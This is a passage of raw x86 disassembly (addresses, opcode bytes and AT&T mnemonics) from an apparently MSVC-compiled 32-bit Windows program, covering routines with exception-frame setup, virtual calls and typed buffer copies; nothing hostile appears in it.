  403160:	0f 45 45 88          	cmovne -0x78(%ebp),%eax
  403164:	8b 4d a8             	mov    -0x58(%ebp),%ecx
  403167:	83 ec 0c             	sub    $0xc,%esp
  40316a:	50                   	push   %eax
  40316b:	e8 20 bb 01 00       	call   0x41ec90
  403170:	8b f0                	mov    %eax,%esi
  403172:	c6 45 fc 02          	movb   $0x2,-0x4(%ebp)
  403176:	8d 8d 6c ff ff ff    	lea    -0x94(%ebp),%ecx
  40317c:	e8 9f ea ff ff       	call   0x401c20
  403181:	83 fe ff             	cmp    $0xffffffff,%esi
  403184:	8b 35 20 52 43 00    	mov    0x435220,%esi
  40318a:	75 35                	jne    0x4031c1
  40318c:	68 b0 5e 43 00       	push   $0x435eb0
  403191:	ff d6                	call   *%esi
  403193:	68 c8 5e 43 00       	push   $0x435ec8
  403198:	8b f8                	mov    %eax,%edi
  40319a:	ff d6                	call   *%esi
  40319c:	8b 4d cc             	mov    -0x34(%ebp),%ecx
  40319f:	8b f0                	mov    %eax,%esi
  4031a1:	56                   	push   %esi
  4031a2:	57                   	push   %edi
  4031a3:	51                   	push   %ecx
  4031a4:	8b 11                	mov    (%ecx),%edx
  4031a6:	ff 52 28             	call   *0x28(%edx)
  4031a9:	57                   	push   %edi
  4031aa:	8b 3d 08 52 43 00    	mov    0x435208,%edi
  4031b0:	89 45 c8             	mov    %eax,-0x38(%ebp)
  4031b3:	ff d7                	call   *%edi
  4031b5:	56                   	push   %esi
  4031b6:	ff d7                	call   *%edi
  4031b8:	8b 7d c8             	mov    -0x38(%ebp),%edi
  4031bb:	8b 35 20 52 43 00    	mov    0x435220,%esi
  4031c1:	8b 55 9c             	mov    -0x64(%ebp),%edx
  4031c4:	33 c0                	xor    %eax,%eax
  4031c6:	8b 4a 0c             	mov    0xc(%edx),%ecx
  4031c9:	85 c9                	test   %ecx,%ecx
  4031cb:	74 08                	je     0x4031d5
  4031cd:	66 39 01             	cmp    %ax,(%ecx)
  4031d0:	0f 94 c0             	sete   %al
  4031d3:	eb 07                	jmp    0x4031dc
  4031d5:	83 7a 24 02          	cmpl   $0x2,0x24(%edx)
  4031d9:	0f 9e c0             	setle  %al
  4031dc:	85 c0                	test   %eax,%eax
  4031de:	75 4d                	jne    0x40322d
  4031e0:	85 ff                	test   %edi,%edi
  4031e2:	0f 88 e9 01 00 00    	js     0x4033d1
  4031e8:	68 30 5f 43 00       	push   $0x435f30
  4031ed:	ff d6                	call   *%esi
  4031ef:	8b f8                	mov    %eax,%edi
  4031f1:	8b 45 9c             	mov    -0x64(%ebp),%eax
  4031f4:	89 7d a4             	mov    %edi,-0x5c(%ebp)
  4031f7:	8b 48 0c             	mov    0xc(%eax),%ecx
  4031fa:	85 c9                	test   %ecx,%ecx
  4031fc:	75 0d                	jne    0x40320b
  4031fe:	39 48 24             	cmp    %ecx,0x24(%eax)
  403201:	b9 c0 57 43 00       	mov    $0x4357c0,%ecx
  403206:	74 03                	je     0x40320b
  403208:	8b 48 1c             	mov    0x1c(%eax),%ecx
  40320b:	51                   	push   %ecx
  40320c:	ff d6                	call   *%esi
  40320e:	8b 4d cc             	mov    -0x34(%ebp),%ecx
  403211:	8b f0                	mov    %eax,%esi
  403213:	56                   	push   %esi
  403214:	57                   	push   %edi
  403215:	51                   	push   %ecx
  403216:	8b 11                	mov    (%ecx),%edx
  403218:	ff 52 28             	call   *0x28(%edx)
  40321b:	ff 75 a4             	push   -0x5c(%ebp)
  40321e:	8b f8                	mov    %eax,%edi
  403220:	ff 15 08 52 43 00    	call   *0x435208
  403226:	56                   	push   %esi
  403227:	ff 15 08 52 43 00    	call   *0x435208
  40322d:	85 ff                	test   %edi,%edi
  40322f:	0f 88 9c 01 00 00    	js     0x4033d1
  403235:	b8 08 00 00 00       	mov    $0x8,%eax
  40323a:	66 89 85 54 ff ff ff 	mov    %ax,-0xac(%ebp)
  403241:	8b 85 68 ff ff ff    	mov    -0x98(%ebp),%eax
  403247:	f6 40 04 01          	testb  $0x1,0x4(%eax)
  40324b:	74 19                	je     0x403266
  40324d:	8b 4d a0             	mov    -0x60(%ebp),%ecx
  403250:	8b 41 0c             	mov    0xc(%ecx),%eax
  403253:	85 c0                	test   %eax,%eax
  403255:	75 1c                	jne    0x403273
  403257:	39 41 24             	cmp    %eax,0x24(%ecx)
  40325a:	b8 c0 57 43 00       	mov    $0x4357c0,%eax
  40325f:	74 12                	je     0x403273
  403261:	8b 41 1c             	mov    0x1c(%ecx),%eax
  403264:	eb 0d                	jmp    0x403273
  403266:	83 78 14 00          	cmpl   $0x0,0x14(%eax)
  40326a:	75 04                	jne    0x403270
  40326c:	33 c0                	xor    %eax,%eax
  40326e:	eb 03                	jmp    0x403273
  403270:	8b 40 0c             	mov    0xc(%eax),%eax
  403273:	8b 35 20 52 43 00    	mov    0x435220,%esi
  403279:	50                   	push   %eax
  40327a:	ff d6                	call   *%esi
  40327c:	8b 4d cc             	mov    -0x34(%ebp),%ecx
  40327f:	8b f8                	mov    %eax,%edi
  403281:	83 ec 10             	sub    $0x10,%esp
  403284:	89 bd 5c ff ff ff    	mov    %edi,-0xa4(%ebp)
  40328a:	0f 10 85 54 ff ff ff 	movups -0xac(%ebp),%xmm0
  403291:	8b c4                	mov    %esp,%eax
  403293:	8b 11                	mov    (%ecx),%edx
  403295:	51                   	push   %ecx
  403296:	0f 11 00             	movups %xmm0,(%eax)
  403299:	ff 52 34             	call   *0x34(%edx)
  40329c:	57                   	push   %edi
  40329d:	8b f0                	mov    %eax,%esi
  40329f:	ff 15 08 52 43 00    	call   *0x435208
  4032a5:	85 f6                	test   %esi,%esi
  4032a7:	0f 88 24 01 00 00    	js     0x4033d1
  4032ad:	8b 45 cc             	mov    -0x34(%ebp),%eax
  4032b0:	8d 95 54 ff ff ff    	lea    -0xac(%ebp),%edx
  4032b6:	0f 57 c0             	xorps  %xmm0,%xmm0
  4032b9:	0f 11 85 54 ff ff ff 	movups %xmm0,-0xac(%ebp)
  4032c0:	52                   	push   %edx
  4032c1:	8b 08                	mov    (%eax),%ecx
  4032c3:	50                   	push   %eax
  4032c4:	ff 51 44             	call   *0x44(%ecx)
  4032c7:	8b b5 5c ff ff ff    	mov    -0xa4(%ebp),%esi
  4032cd:	89 75 a0             	mov    %esi,-0x60(%ebp)
  4032d0:	85 f6                	test   %esi,%esi
  4032d2:	0f 84 f9 00 00 00    	je     0x4033d1
  4032d8:	8b 7e 10             	mov    0x10(%esi),%edi
  4032db:	8b 76 0c             	mov    0xc(%esi),%esi
  4032de:	c7 45 c0 00 00 00 00 	movl   $0x0,-0x40(%ebp)
  4032e5:	39 7d bc             	cmp    %edi,-0x44(%ebp)
  4032e8:	0f 8c b4 00 00 00    	jl     0x4033a2
  4032ee:	83 ff 01             	cmp    $0x1,%edi
  4032f1:	75 22                	jne    0x403315
  4032f3:	85 f6                	test   %esi,%esi
  4032f5:	75 0f                	jne    0x403306
  4032f7:	8b 45 b8             	mov    -0x48(%ebp),%eax
  4032fa:	32 c9                	xor    %cl,%cl
  4032fc:	88 08                	mov    %cl,(%eax)
  4032fe:	ff 45 c0             	incl   -0x40(%ebp)
  403301:	e9 c2 00 00 00       	jmp    0x4033c8
  403306:	8b 45 b8             	mov    -0x48(%ebp),%eax
  403309:	8a 0e                	mov    (%esi),%cl
  40330b:	88 08                	mov    %cl,(%eax)
  40330d:	ff 45 c0             	incl   -0x40(%ebp)
  403310:	e9 b3 00 00 00       	jmp    0x4033c8
  403315:	83 ff 02             	cmp    $0x2,%edi
  403318:	75 26                	jne    0x403340
  40331a:	85 f6                	test   %esi,%esi
  40331c:	75 10                	jne    0x40332e
  40331e:	8b 45 b8             	mov    -0x48(%ebp),%eax
  403321:	33 c9                	xor    %ecx,%ecx
  403323:	66 89 08             	mov    %cx,(%eax)
  403326:	01 7d c0             	add    %edi,-0x40(%ebp)
  403329:	e9 9a 00 00 00       	jmp    0x4033c8
  40332e:	8b 45 b8             	mov    -0x48(%ebp),%eax
  403331:	0f b7 0e             	movzwl (%esi),%ecx
  403334:	66 89 08             	mov    %cx,(%eax)
  403337:	83 45 c0 02          	addl   $0x2,-0x40(%ebp)
  40333b:	e9 88 00 00 00       	jmp    0x4033c8
  403340:	83 ff 04             	cmp    $0x4,%edi
  403343:	75 1d                	jne    0x403362
  403345:	85 f6                	test   %esi,%esi
  403347:	75 0c                	jne    0x403355
  403349:	8b 45 b8             	mov    -0x48(%ebp),%eax
  40334c:	33 c9                	xor    %ecx,%ecx
  40334e:	89 08                	mov    %ecx,(%eax)
  403350:	01 7d c0             	add    %edi,-0x40(%ebp)
  403353:	eb 73                	jmp    0x4033c8
  403355:	8b 45 b8             	mov    -0x48(%ebp),%eax
  403358:	8b 0e                	mov    (%esi),%ecx
  40335a:	89 08                	mov    %ecx,(%eax)
  40335c:	83 45 c0 04          	addl   $0x4,-0x40(%ebp)
  403360:	eb 66                	jmp    0x4033c8
  403362:	83 ff 08             	cmp    $0x8,%edi
  403365:	75 3b                	jne    0x4033a2
  403367:	85 f6                	test   %esi,%esi
  403369:	75 24                	jne    0x40338f
  40336b:	8b 45 b8             	mov    -0x48(%ebp),%eax
  40336e:	0f 57 c0             	xorps  %xmm0,%xmm0
  403371:	66 0f 13 85 64 ff ff 	movlpd %xmm0,-0x9c(%ebp)
  403378:	ff 
  403379:	8b 8d 64 ff ff ff    	mov    -0x9c(%ebp),%ecx
  40337f:	8b 95 68 ff ff ff    	mov    -0x98(%ebp),%edx
  403385:	89 08                	mov    %ecx,(%eax)
  403387:	89 50 04             	mov    %edx,0x4(%eax)
  40338a:	01 7d c0             	add    %edi,-0x40(%ebp)
  40338d:	eb 39                	jmp    0x4033c8
  40338f:	8b 45 b8             	mov    -0x48(%ebp),%eax
  403392:	8b 0e                	mov    (%esi),%ecx
  403394:	8b 56 04             	mov    0x4(%esi),%edx
  403397:	89 08                	mov    %ecx,(%eax)
  403399:	89 50 04             	mov    %edx,0x4(%eax)
  40339c:	83 45 c0 08          	addl   $0x8,-0x40(%ebp)
  4033a0:	eb 26                	jmp    0x4033c8
  4033a2:	85 ff                	test   %edi,%edi
  4033a4:	7e 22                	jle    0x4033c8
  4033a6:	57                   	push   %edi
  4033a7:	8d 4d ac             	lea    -0x54(%ebp),%ecx
  4033aa:	e8 41 a1 01 00       	call   0x41d4f0
  4033af:	57                   	push   %edi
  4033b0:	85 f6                	test   %esi,%esi
  4033b2:	74 09                	je     0x4033bd
  4033b4:	56                   	push   %esi
  4033b5:	50                   	push   %eax
  4033b6:	e8 c0 b8 02 00       	call   0x42ec7b
  4033bb:	eb 08                	jmp    0x4033c5
  4033bd:	6a 00                	push   $0x0
  4033bf:	50                   	push   %eax
  4033c0:	e8 4f b7 02 00       	call   0x42eb14
  4033c5:	83 c4 0c             	add    $0xc,%esp
  4033c8:	ff 75 a0             	push   -0x60(%ebp)
  4033cb:	ff 15 1c 52 43 00    	call   *0x43521c
  4033d1:	8b 4d cc             	mov    -0x34(%ebp),%ecx
  4033d4:	85 c9                	test   %ecx,%ecx
  4033d6:	74 06                	je     0x4033de
  4033d8:	8b 01                	mov    (%ecx),%eax
  4033da:	51                   	push   %ecx
  4033db:	ff 50 08             	call   *0x8(%eax)
  4033de:	ff 15 48 55 43 00    	call   *0x435548
  4033e4:	8b b5 50 ff ff ff    	mov    -0xb0(%ebp),%esi
  4033ea:	8d 45 ac             	lea    -0x54(%ebp),%eax
  4033ed:	50                   	push   %eax
  4033ee:	8b ce                	mov    %esi,%ecx
  4033f0:	e8 fb ec ff ff       	call   0x4020f0
  4033f5:	c7 45 98 01 00 00 00 	movl   $0x1,-0x68(%ebp)
  4033fc:	c6 45 fc 00          	movb   $0x0,-0x4(%ebp)
  403400:	c7 45 ac 10 5d 43 00 	movl   $0x435d10,-0x54(%ebp)
  403407:	c7 45 fc 13 00 00 00 	movl   $0x13,-0x4(%ebp)
  40340e:	8b 4d b8             	mov    -0x48(%ebp),%ecx
  403411:	85 c9                	test   %ecx,%ecx
  403413:	74 1f                	je     0x403434
  403415:	8b 45 ac             	mov    -0x54(%ebp),%eax
  403418:	51                   	push   %ecx
  403419:	8b 40 0c             	mov    0xc(%eax),%eax
  40341c:	3d 40 b7 41 00       	cmp    $0x41b740,%eax
  403421:	75 0c                	jne    0x40342f
  403423:	b9 b8 69 44 00       	mov    $0x4469b8,%ecx
  403428:	e8 a3 aa 01 00       	call   0x41ded0
  40342d:	eb 05                	jmp    0x403434
  40342f:	8d 4d ac             	lea    -0x54(%ebp),%ecx
  403432:	ff d0                	call   *%eax
  403434:	c7 45 b8 00 00 00 00 	movl   $0x0,-0x48(%ebp)
  40343b:	c7 45 c0 00 00 00 00 	movl   $0x0,-0x40(%ebp)
  403442:	c7 45 bc 00 00 00 00 	movl   $0x0,-0x44(%ebp)
  403449:	c6 45 fc 00          	movb   $0x0,-0x4(%ebp)
  40344d:	c7 45 ac 74 5d 43 00 	movl   $0x435d74,-0x54(%ebp)
  403454:	8b c6                	mov    %esi,%eax
  403456:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  403459:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  403460:	59                   	pop    %ecx
  403461:	5f                   	pop    %edi
  403462:	5e                   	pop    %esi
  403463:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  403466:	33 cd                	xor    %ebp,%ecx
  403468:	e8 46 a6 02 00       	call   0x42dab3
  40346d:	8b e5                	mov    %ebp,%esp
  40346f:	5d                   	pop    %ebp
  403470:	c2 38 00             	ret    $0x38
  403473:	cc                   	int3
  403474:	cc                   	int3
  403475:	cc                   	int3
  403476:	cc                   	int3
  403477:	cc                   	int3
  403478:	cc                   	int3
  403479:	cc                   	int3
  40347a:	cc                   	int3
  40347b:	cc                   	int3
  40347c:	cc                   	int3
  40347d:	cc                   	int3
  40347e:	cc                   	int3
  40347f:	cc                   	int3
  403480:	e9 db 03 00 00       	jmp    0x403860
  403485:	cc                   	int3
  403486:	cc                   	int3
  403487:	cc                   	int3
  403488:	cc                   	int3
  403489:	cc                   	int3
  40348a:	cc                   	int3
  40348b:	cc                   	int3
  40348c:	cc                   	int3
  40348d:	cc                   	int3
  40348e:	cc                   	int3
  40348f:	cc                   	int3
  403490:	55                   	push   %ebp
  403491:	8b ec                	mov    %esp,%ebp
  403493:	53                   	push   %ebx
  403494:	56                   	push   %esi
  403495:	57                   	push   %edi
  403496:	8b d9                	mov    %ecx,%ebx
  403498:	e8 c3 03 00 00       	call   0x403860
  40349d:	8b 7d 08             	mov    0x8(%ebp),%edi
  4034a0:	8b f0                	mov    %eax,%esi
  4034a2:	8b cf                	mov    %edi,%ecx
  4034a4:	8b 17                	mov    (%edi),%edx
  4034a6:	ff 52 14             	call   *0x14(%edx)
  4034a9:	3b f0                	cmp    %eax,%esi
  4034ab:	74 2d                	je     0x4034da
  4034ad:	8b 48 0c             	mov    0xc(%eax),%ecx
  4034b0:	3b 4e 0c             	cmp    0xc(%esi),%ecx
  4034b3:	75 1c                	jne    0x4034d1
  4034b5:	8b 4e 08             	mov    0x8(%esi),%ecx
  4034b8:	39 48 08             	cmp    %ecx,0x8(%eax)
  4034bb:	75 14                	jne    0x4034d1
  4034bd:	51                   	push   %ecx
  4034be:	ff 76 04             	push   0x4(%esi)
  4034c1:	ff 70 04             	push   0x4(%eax)
  4034c4:	ff 15 c4 54 43 00    	call   *0x4354c4
  4034ca:	83 c4 0c             	add    $0xc,%esp
  4034cd:	85 c0                	test   %eax,%eax
  4034cf:	74 09                	je     0x4034da
  4034d1:	5f                   	pop    %edi
  4034d2:	5e                   	pop    %esi
  4034d3:	33 c0                	xor    %eax,%eax
  4034d5:	5b                   	pop    %ebx
  4034d6:	5d                   	pop    %ebp
  4034d7:	c2 04 00             	ret    $0x4
  4034da:	57                   	push   %edi
  4034db:	8b cb                	mov    %ebx,%ecx
  4034dd:	e8 de e3 ff ff       	call   0x4018c0
  4034e2:	5f                   	pop    %edi
  4034e3:	5e                   	pop    %esi
  4034e4:	5b                   	pop    %ebx
  4034e5:	5d                   	pop    %ebp
  4034e6:	c2 04 00             	ret    $0x4
  4034e9:	cc                   	int3
  4034ea:	cc                   	int3
  4034eb:	cc                   	int3
  4034ec:	cc                   	int3
  4034ed:	cc                   	int3
  4034ee:	cc                   	int3
  4034ef:	cc                   	int3
  4034f0:	55                   	push   %ebp
  4034f1:	8b ec                	mov    %esp,%ebp
  4034f3:	6a ff                	push   $0xffffffff
  4034f5:	68 65 f2 42 00       	push   $0x42f265
  4034fa:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
  403500:	50                   	push   %eax
  403501:	51                   	push   %ecx
  403502:	a1 0c 40 44 00       	mov    0x44400c,%eax
  403507:	33 c5                	xor    %ebp,%eax
  403509:	50                   	push   %eax
  40350a:	8d 45 f4             	lea    -0xc(%ebp),%eax
  40350d:	64 a3 00 00 00 00    	mov    %eax,%fs:0x0
  403513:	83 3d c8 69 44 00 2c 	cmpl   $0x2c,0x4469c8
  40351a:	7c 2c                	jl     0x403548
  40351c:	68 cc 69 44 00       	push   $0x4469cc
  403521:	e8 da a7 01 00       	call   0x41dd00
  403526:	8b 15 c4 69 44 00    	mov    0x4469c4,%edx
  40352c:	83 c4 04             	add    $0x4,%esp
  40352f:	85 d2                	test   %edx,%edx
  403531:	74 07                	je     0x40353a
  403533:	8b 02                	mov    (%edx),%eax
  403535:	a3 c4 69 44 00       	mov    %eax,0x4469c4
  40353a:	c7 05 cc 69 44 00 01 	movl   $0x1,0x4469cc
  403541:	00 00 00 
  403544:	85 d2                	test   %edx,%edx
  403546:	75 1f                	jne    0x403567
  403548:	6a 2c                	push   $0x2c
  40354a:	6a 00                	push   $0x0
  40354c:	ff 15 d8 51 43 00    	call   *0x4351d8
  403552:	50                   	push   %eax
  403553:	ff 15 e8 51 43 00    	call   *0x4351e8
  403559:	8b d0                	mov    %eax,%edx
  40355b:	85 d2                	test   %edx,%edx
  40355d:	75 08                	jne    0x403567
  40355f:	6a ff                	push   $0xffffffff
  403561:	ff 15 4c 54 43 00    	call   *0x43544c
  403567:	89 55 f0             	mov    %edx,-0x10(%ebp)
  40356a:	c7 45 fc 00 00 00 00 	movl   $0x0,-0x4(%ebp)
  403571:	8b ca                	mov    %edx,%ecx
  403573:	e8 c8 f1 ff ff       	call   0x402740
  403578:	c6 45 fc 01          	movb   $0x1,-0x4(%ebp)
  40357c:	c7 02 54 5f 43 00    	movl   $0x435f54,(%edx)
  403582:	c7 45 fc ff ff ff ff 	movl   $0xffffffff,-0x4(%ebp)
  403589:	8b c2                	mov    %edx,%eax
  40358b:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  40358e:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  403595:	59                   	pop    %ecx
  403596:	8b e5                	mov    %ebp,%esp
  403598:	5d                   	pop    %ebp
  403599:	c3                   	ret
  40359a:	cc                   	int3
  40359b:	cc                   	int3
  40359c:	cc                   	int3
  40359d:	cc                   	int3
  40359e:	cc                   	int3
  40359f:	cc                   	int3
  4035a0:	55                   	push   %ebp
  4035a1:	8b ec                	mov    %esp,%ebp
  4035a3:	6a ff                	push   $0xffffffff
  4035a5:	68 ad f2 42 00       	push   $0x42f2ad
  4035aa:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
  4035b0:	50                   	push   %eax
  4035b1:	51                   	push   %ecx
  4035b2:	53                   	push   %ebx
  4035b3:	56                   	push   %esi
  4035b4:	57                   	push   %edi
  4035b5:	a1 0c 40 44 00       	mov    0x44400c,%eax
  4035ba:	33 c5                	xor    %ebp,%eax
  4035bc:	50                   	push   %eax
  4035bd:	8d 45 f4             	lea    -0xc(%ebp),%eax
  4035c0:	64 a3 00 00 00 00    	mov    %eax,%fs:0x0
  4035c6:	8b d9                	mov    %ecx,%ebx
  4035c8:	83 3d c8 69 44 00 2c 	cmpl   $0x2c,0x4469c8
  4035cf:	7c 2c                	jl     0x4035fd
  4035d1:	68 cc 69 44 00       	push   $0x4469cc
  4035d6:	e8 25 a7 01 00       	call   0x41dd00
  4035db:	8b 3d c4 69 44 00    	mov    0x4469c4,%edi
  4035e1:	83 c4 04             	add    $0x4,%esp
  4035e4:	85 ff                	test   %edi,%edi
  4035e6:	74 07                	je     0x4035ef
  4035e8:	8b 07                	mov    (%edi),%eax
  4035ea:	a3 c4 69 44 00       	mov    %eax,0x4469c4
  4035ef:	c7 05 cc 69 44 00 01 	movl   $0x1,0x4469cc
  4035f6:	00 00 00 
  4035f9:	85 ff                	test   %edi,%edi
  4035fb:	75 1f                	jne    0x40361c
  4035fd:	6a 2c                	push   $0x2c
  4035ff:	6a 00                	push   $0x0
  403601:	ff 15 d8 51 43 00    	call   *0x4351d8
  403607:	50                   	push   %eax
  403608:	ff 15 e8 51 43 00    	call   *0x4351e8
  40360e:	8b f8                	mov    %eax,%edi
  403610:	85 ff                	test   %edi,%edi
  403612:	75 08                	jne    0x40361c
  403614:	6a ff                	push   $0xffffffff
  403616:	ff 15 4c 54 43 00    	call   *0x43544c
  40361c:	89 7d f0             	mov    %edi,-0x10(%ebp)
  40361f:	c7 45 fc 00 00 00 00 	movl   $0x0,-0x4(%ebp)
  403626:	8b cf                	mov    %edi,%ecx
  403628:	e8 13 f1 ff ff       	call   0x402740
  40362d:	c6 45 fc 01          	movb   $0x1,-0x4(%ebp)
  403631:	c7 07 54 5f 43 00    	movl   $0x435f54,(%edi)
  403637:	c6 45 fc 02          	movb   $0x2,-0x4(%ebp)
  40363b:	8d 4f 10             	lea    0x10(%edi),%ecx
  40363e:	c7 07 54 5f 43 00    	movl   $0x435f54,(%edi)
  403644:	8b 43 04             	mov    0x4(%ebx),%eax
  403647:	89 47 04             	mov    %eax,0x4(%edi)
  40364a:	8b 43 08             	mov    0x8(%ebx),%eax
  40364d:	89 47 08             	mov    %eax,0x8(%edi)
  403650:	8b 43 0c             	mov    0xc(%ebx),%eax
  403653:	89 47 0c             	mov    %eax,0xc(%edi)
  403656:	8b 47 10             	mov    0x10(%edi),%eax
  403659:	ff 50 44             	call   *0x44(%eax)
  40365c:	8d 43 10             	lea    0x10(%ebx),%eax
  40365f:	50                   	push   %eax
  403660:	8d 4f 10             	lea    0x10(%edi),%ecx
  403663:	e8 18 ec ff ff       	call   0x402280
  403668:	c7 45 fc ff ff ff ff 	movl   $0xffffffff,-0x4(%ebp)
  40366f:	8b c7                	mov    %edi,%eax
  403671:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  403674:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  40367b:	59                   	pop    %ecx
  40367c:	5f                   	pop    %edi
  40367d:	5e                   	pop    %esi
  40367e:	5b                   	pop    %ebx
  40367f:	8b e5                	mov    %ebp,%esp
  403681:	5d                   	pop    %ebp
  403682:	c3                   	ret
  403683:	cc                   	int3
  403684:	cc                   	int3
  403685:	cc                   	int3
  403686:	cc                   	int3
  403687:	cc                   	int3
  403688:	cc                   	int3
  403689:	cc                   	int3
  40368a:	cc                   	int3
  40368b:	cc                   	int3
  40368c:	cc                   	int3
  40368d:	cc                   	int3
  40368e:	cc                   	int3
  40368f:	cc                   	int3
  403690:	55                   	push   %ebp
  403691:	8b ec                	mov    %esp,%ebp
  403693:	53                   	push   %ebx
  403694:	56                   	push   %esi
  403695:	57                   	push   %edi
  403696:	8b 7d 08             	mov    0x8(%ebp),%edi
  403699:	8b d9                	mov    %ecx,%ebx
  40369b:	8b 37                	mov    (%edi),%esi
  40369d:	e8 be 01 00 00       	call   0x403860
  4036a2:	50                   	push   %eax
  4036a3:	8b cf                	mov    %edi,%ecx
  4036a5:	ff 56 34             	call   *0x34(%esi)
  4036a8:	85 c0                	test   %eax,%eax
  4036aa:	74 3a                	je     0x4036e6
  4036ac:	8b 03                	mov    (%ebx),%eax
  4036ae:	8b cb                	mov    %ebx,%ecx
  4036b0:	ff 50 44             	call   *0x44(%eax)
  4036b3:	8b 47 04             	mov    0x4(%edi),%eax
  4036b6:	8d 4b 10             	lea    0x10(%ebx),%ecx
  4036b9:	89 43 04             	mov    %eax,0x4(%ebx)
  4036bc:	8b 47 08             	mov    0x8(%edi),%eax
  4036bf:	89 43 08             	mov    %eax,0x8(%ebx)
  4036c2:	8b 47 0c             	mov    0xc(%edi),%eax
  4036c5:	89 43 0c             	mov    %eax,0xc(%ebx)
  4036c8:	8b 43 10             	mov    0x10(%ebx),%eax
  4036cb:	ff 50 44             	call   *0x44(%eax)
  4036ce:	8d 47 10             	lea    0x10(%edi),%eax
  4036d1:	50                   	push   %eax
  4036d2:	8d 4b 10             	lea    0x10(%ebx),%ecx
  4036d5:	e8 a6 eb ff ff       	call   0x402280
  4036da:	5f                   	pop    %edi
  4036db:	5e                   	pop    %esi
  4036dc:	b8 01 00 00 00       	mov    $0x1,%eax
  4036e1:	5b                   	pop    %ebx
  4036e2:	5d                   	pop    %ebp
  4036e3:	c2 04 00             	ret    $0x4
  4036e6:	5f                   	pop    %edi
  4036e7:	5e                   	pop    %esi
  4036e8:	33 c0                	xor    %eax,%eax
  4036ea:	5b                   	pop    %ebx
  4036eb:	5d                   	pop    %ebp
  4036ec:	c2 04 00             	ret    $0x4
  4036ef:	cc                   	int3
  4036f0:	55                   	push   %ebp
  4036f1:	8b ec                	mov    %esp,%ebp
  4036f3:	6a ff                	push   $0xffffffff
  4036f5:	68 dd f2 42 00       	push   $0x42f2dd
  4036fa:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
  403700:	50                   	push   %eax
  403701:	51                   	push   %ecx
  403702:	a1 0c 40 44 00       	mov    0x44400c,%eax
  403707:	33 c5                	xor    %ebp,%eax
  403709:	50                   	push   %eax
  40370a:	8d 45 f4             	lea    -0xc(%ebp),%eax
  40370d:	64 a3 00 00 00 00    	mov    %eax,%fs:0x0
  403713:	89 4d f0             	mov    %ecx,-0x10(%ebp)
  403716:	c7 45 fc ff ff ff ff 	movl   $0xffffffff,-0x4(%ebp)
  40371d:	e8 fe e4 ff ff       	call   0x401c20
  403722:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  403725:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  40372c:	59                   	pop    %ecx
  40372d:	8b e5                	mov    %ebp,%esp
  40372f:	5d                   	pop    %ebp
  403730:	c3                   	ret
  403731:	cc                   	int3
  403732:	cc                   	int3
  403733:	cc                   	int3
  403734:	cc                   	int3
  403735:	cc                   	int3
  403736:	cc                   	int3
  403737:	cc                   	int3
  403738:	cc                   	int3
  403739:	cc                   	int3
  40373a:	cc                   	int3
  40373b:	cc                   	int3
  40373c:	cc                   	int3
  40373d:	cc                   	int3
  40373e:	cc                   	int3
  40373f:	cc                   	int3
  403740:	55                   	push   %ebp
  403741:	8b ec                	mov    %esp,%ebp
  403743:	6a ff                	push   $0xffffffff
  403745:	68 1d f3 42 00       	push   $0x42f31d
  40374a:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
  403750:	50                   	push   %eax
  403751:	83 ec 2c             	sub    $0x2c,%esp
  403754:	56                   	push   %esi
  403755:	a1 0c 40 44 00       	mov    0x44400c,%eax
  40375a:	33 c5                	xor    %ebp,%eax
  40375c:	50                   	push   %eax
  40375d:	8d 45 f4             	lea    -0xc(%ebp),%eax
  403760:	64 a3 00 00 00 00    	mov    %eax,%fs:0x0
  403766:	8b f1                	mov    %ecx,%esi
  403768:	8d 4d c8             	lea    -0x38(%ebp),%ecx
  40376b:	e8 d0 ef ff ff       	call   0x402740
  403770:	c7 45 fc 00 00 00 00 	movl   $0x0,-0x4(%ebp)
  403777:	c7 45 c8 54 5f 43 00 	movl   $0x435f54,-0x38(%ebp)
  40377e:	c7 45 fc 01 00 00 00 	movl   $0x1,-0x4(%ebp)
  403785:	8b ce                	mov    %esi,%ecx
  403787:	8b 06                	mov    (%esi),%eax
  403789:	ff 50 44             	call   *0x44(%eax)
  40378c:	8b 45 cc             	mov    -0x34(%ebp),%eax
  40378f:	8d 4e 10             	lea    0x10(%esi),%ecx
  403792:	89 46 04             	mov    %eax,0x4(%esi)
  403795:	8b 45 d0             	mov    -0x30(%ebp),%eax
  403798:	89 46 08             	mov    %eax,0x8(%esi)
  40379b:	8b 45 d4             	mov    -0x2c(%ebp),%eax
  40379e:	89 46 0c             	mov    %eax,0xc(%esi)
  4037a1:	8b 46 10             	mov    0x10(%esi),%eax
  4037a4:	ff 50 44             	call   *0x44(%eax)
  4037a7:	8d 45 d8             	lea    -0x28(%ebp),%eax
  4037aa:	50                   	push   %eax
  4037ab:	8d 4e 10             	lea    0x10(%esi),%ecx
  4037ae:	e8 cd ea ff ff       	call   0x402280
  4037b3:	c7 45 fc ff ff ff ff 	movl   $0xffffffff,-0x4(%ebp)
  4037ba:	8d 4d c8             	lea    -0x38(%ebp),%ecx
  4037bd:	e8 5e e4 ff ff       	call   0x401c20
  4037c2:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  4037c5:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  4037cc:	59                   	pop    %ecx
  4037cd:	5e                   	pop    %esi
  4037ce:	8b e5                	mov    %ebp,%esp
  4037d0:	5d                   	pop    %ebp
  4037d1:	c3                   	ret
  4037d2:	cc                   	int3
  4037d3:	cc                   	int3
  4037d4:	cc                   	int3
  4037d5:	cc                   	int3
  4037d6:	cc                   	int3
  4037d7:	cc                   	int3
  4037d8:	cc                   	int3
  4037d9:	cc                   	int3
  4037da:	cc                   	int3
  4037db:	cc                   	int3
  4037dc:	cc                   	int3
  4037dd:	cc                   	int3
  4037de:	cc                   	int3
  4037df:	cc                   	int3
  4037e0:	55                   	push   %ebp
  4037e1:	8b ec                	mov    %esp,%ebp
  4037e3:	6a ff                	push   $0xffffffff
